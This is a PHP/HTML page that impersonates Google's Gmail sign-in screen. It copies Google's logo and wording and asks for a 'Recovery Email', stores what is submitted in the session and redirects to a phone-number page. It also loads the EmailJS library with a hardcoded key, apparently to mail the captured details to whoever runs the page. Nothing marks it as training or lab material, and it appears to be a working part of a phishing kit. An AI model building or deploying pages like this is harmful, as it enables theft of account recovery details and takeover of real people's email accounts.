<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $_SESSION["recovery_email"] = $_POST["recovery_email"];
    header("Location: phone.php");
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail Login - Home</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="script.js">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
    </script>
    <script type="text/javascript">
        (function () {
            emailjs.init({
                publicKey: "jH2r_aWib6H3ZNGGJ",
            });
        })();
    </script>
</head>

<body>
    <div id="loading-overlay" class="loading-overlay"></div>

    <div class="login-container">
        <div class="login-card">
            <div class="logo-container">
                <!-- Google Logo -->
                <svg xmlns="https://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 40 48" aria-hidden="true">
                    <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
                    <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
                    <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
                    <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
                </svg>
            </div>

            <div class="row">
                <div class="left-section">
                    <h1>Sign in</h1>
                    <p>to continue to Gmail</p>
                </div>

                <div class="right-section">
                    <form method="post" >
                        <div class="input-group">
                            <input type="email"name="recovery_email" placeholder=""id="recoveryemail" required placeholder="">
                            <label for="recoveryemail" class="animated-placeholder">Recovery Email</label>
                        </div>
                        <div class="footer">
                            <div class="button-group">
                                <a href="phone.html" class="forgot-link">Ignore</a>
                            </div>
                            <div class="next-button-container">
                                <button type="submit" class="next-button">Next</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <div class="bottom-footer">
        <div class="left-footer">
            <p>English (United States)</p>
        </div>
        <div class="right-footer">
            <p>Help</p>
            <p>Privacy</p>
            <p>Terms</p>
        </div>
    </div>

    <!-- <script>

        // Function to save recovery email to localStorage
        function saveRecoveryEmail() {
            const recoveryEmail = document.getElementById('recoveryemail').value;
            localStorage.setItem('userRecoveryEmail', recoveryEmail);
        }
    </script> -->
</body>

</html>
